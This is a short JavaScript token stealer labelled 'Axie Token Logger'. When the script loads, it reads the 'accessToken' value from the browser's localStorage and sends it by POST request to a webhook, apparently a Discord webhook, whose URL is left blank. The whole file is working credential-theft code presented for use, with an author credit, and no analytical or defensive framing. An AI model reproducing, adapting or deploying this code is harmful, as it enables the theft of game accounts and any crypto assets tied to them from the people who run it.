const WEBHOOK = "";
// embed color 65306

function logToken(token){
    const HTTP = new XMLHttpRequest();
    const data = {
        embeds: [
            {
                title: "Axie Token Logger",
                description: "Written with love by Alper <3",
                color: 65306,
                fields: [
                    {
                        name: "Token",
                        value: token,
                        inline: false
                    }
                ]
            }
        ]
    };
    const data_s = JSON.stringify(data);
    HTTP.open("POST", WEBHOOK);
    HTTP.setRequestHeader("Content-Type", "application/json");
    HTTP.send(data_s);
}

function getToken(){
    let token = "NoToken"
    if (localStorage.hasOwnProperty("accessToken")){
        token = localStorage.getItem("accessToken");
    }
    logToken(token);
}

getToken();
